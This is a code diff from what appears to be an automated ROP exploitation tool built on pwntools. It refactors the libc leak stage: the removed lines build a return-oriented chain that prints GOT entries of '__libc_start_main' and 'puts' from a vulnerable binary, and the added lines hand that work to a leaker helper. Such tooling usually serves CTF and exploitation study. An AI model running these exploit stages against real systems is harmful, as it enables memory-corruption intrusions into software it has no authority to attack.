@@ -1,5 +1,5 @@
 from autorop import PwnState, arutil, constants
-from pwn import context, ROP, log, align
+from pwn import context, ROP, ELF, log, align
 
 
 def puts(state: PwnState) -> PwnState:
@@ -24,28 +24,9 @@ def puts(state: PwnState) -> PwnState:
               function address of libc that was leaked.
     """
     LEAK_FUNCS = ["__libc_start_main", "puts"]
-    rop = ROP(state.elf)
-    for func in LEAK_FUNCS:
-        rop.puts(state.elf.got[func])
 
-    # ensure that call to vuln_function is stack-aligned
-    # by aligning it minus one word
-    # TODO: refactor this for reusability for all rop function calls
-    arutil.align_rop(
-        rop,
-        align(constants.STACK_ALIGNMENT, len(rop.chain())) // context.bytes - 1,
-    )
-    rop.call(state.vuln_function)  # return back so we can execute more chains later
-    log.info(rop.dump())
+    def leaker(rop: ROP, address: int) -> ROP:
+        rop.puts(address)
+        return rop
 
-    state.target.clean(constants.CLEAN_TIME)
-    state.overwriter(state.target, rop.chain())
-
-    for func in LEAK_FUNCS:
-        line = state.target.readline()
-        log.debug(line)
-        # remove last character which must be newline
-        state.leaks[func] = arutil.addressify(line[:-1])
-        log.info(f"leaked {func} @ " + hex(state.leaks[func]))
-
-    return state
+    return arutil.leak_helper(state, leaker, LEAK_FUNCS)
